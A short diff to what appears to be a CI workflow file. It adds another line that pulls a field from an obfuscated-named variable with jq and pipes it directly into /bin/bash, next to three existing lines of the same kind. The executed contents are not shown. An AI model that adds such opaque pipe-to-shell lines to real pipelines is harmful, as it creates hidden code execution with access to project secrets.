@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$gkeo2" | jq -r .v20 | /bin/bash
           printf '%s' "$xikp2" | jq -r .hk7909 | /bin/bash
           echo $rqy2245 | jq -r .pi1383 | /bin/bash
+          echo $odgcs48 | jq -r .psy8351 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
